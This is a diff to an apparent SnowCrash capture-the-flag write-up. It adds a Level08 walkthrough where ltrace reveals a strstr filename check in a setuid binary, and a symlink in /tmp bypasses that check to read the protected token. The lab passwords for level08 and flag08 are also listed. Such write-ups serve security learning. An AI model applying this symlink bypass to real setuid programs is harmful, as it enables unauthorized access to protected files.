@@ -293,3 +293,33 @@ level07@SnowCrash:~$ ./level07
 ```
 
 After that we have to log with `level08` and give the password `fiumuikeil55xe9cu4dood66h`.
+
+## Level08
+
+When we are logging we can see :
+```bash
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+```
+
+After check the 2 file we can run this command :
+```bash
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                            = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                        = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
+We can see the function [strstr](https://man7.org/linux/man-pages/man3/strstr.3.html) call.
+
+```bash
+ln -s /home/user/level08/token /tmp/pwd && ./level08 /tmp/pwd
+```
+
+After that we have to log with `flag08` and give the password `quif5eloekouj29ke0vouxean`.
+When we are connected we just have to use `getflag`.
+
